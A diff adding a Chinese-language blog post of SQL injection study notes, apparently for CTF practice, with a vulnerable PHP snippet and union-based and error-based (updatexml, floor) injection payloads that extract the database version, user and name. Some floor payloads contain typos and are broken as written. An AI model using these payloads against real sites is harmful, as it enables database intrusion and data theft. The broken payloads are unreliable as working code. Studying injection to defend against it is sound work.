@@ -147,6 +147,110 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/23/sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lgq">
+      <meta itemprop="description" content="欢迎浏览， 请多多指教">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of lgq">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/23/sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-23 15:35:25 / 修改时间：22:26:14" itemprop="dateCreated datePublished" datetime="2020-12-23T15:35:25+08:00">2020-12-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入的成因是开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如Cookes、UserAgent等）与SQL语句进行拼接，造成待执行的SQL语句失控，从而使我们可以执行任意SQL语句。</p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>1）可回显的注入</p>
+<p>可以联合查询的注入</p>
+<p>报错注入</p>
+<p>通过注入进行DNS请求，从而达到可回显的目的</p>
+<p>2）不可回显的注入</p>
+<p>Bool盲注</p>
+<p>时间盲注</p>
+<p>3）二次注入</p>
+<p>通常作为一种业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入</p>
+<h3 id="可以联合查询的SQL注入"><a href="#可以联合查询的SQL注入" class="headerlink" title="可以联合查询的SQL注入"></a>可以联合查询的SQL注入</h3><p>在可以联合查询的题目中，一般会将数据库查询的数据回显到页面中,比如下面这个例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$getid &#x3D; &quot;SELECT ID FROM users WHERE user_id &#x3D; &#39;$id&#39;&quot;;</span><br><span class="line">$result &#x3D; mysql_query($getid) or die(&#39;&lt;pre&gt;&#39;.mysql_erroe().&#39;&lt;&#x2F;pre&gt;&#39;);</span><br><span class="line">$num &#x3D;mysql_numrows($result);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>改版了会将GET获取到的参数直接拼接到SQL语句中，如果此时传入参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id &#x3D;-1&#39;union+select+1+--+</span><br></pre></td></tr></table></figure>
+
+<p>拼接后SQL语句变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ID FROM users WHERE user_id &#x3D; &#39;-1&#39;union select 1 -- &#39;</span><br></pre></td></tr></table></figure>
+
+<p>服务器在处理用户输入的时候已经自动将加号转义为空格符，所以查询语句中没用出现加号</p>
+<p>闭合前面的单引号，注释掉后面的单引号，中间写上需要的payload即可；</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>updatexml的报错原理从本质上来说就是函数的报错</p>
+<p>还是使用什么的例子，爆破数据库版本的样例payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id &#x3D;1&#39;+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>爆破当前用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id &#x3D;1&#39;+updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>爆破当前使用的数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id &#x3D;1&#39;+updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p>floor报错原理是rand和order by或group by的冲突。</p>
+<p>爆破当前用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(selecct 1 from(select concat(*),concat((select (select (select concat(ox7e,user(),0x7e))) from information_schema.tables limt 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+
+<p>爆破当前数据库版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(selecct 1 from(select concat(*),concat((select (select (select concat(ox7e,version(),0x7e))) from information_schema.tables limt 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+
+<p>爆破当前使用的数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(selecct 1 from(select concat(*),concat((select (select (select concat(ox7e,database(),0x7e))) from information_schema.tables limt 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+
+<p>爆破指定表的字段（以表名为emailes为例）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+ 
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/17/web%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1717,7 +1821,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1787,7 +1891,7 @@ $(document).ready(function() {
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共11.1k字</span>
+  <span class="post-count">博客全站共11.7k字</span>
 </div>
 
         
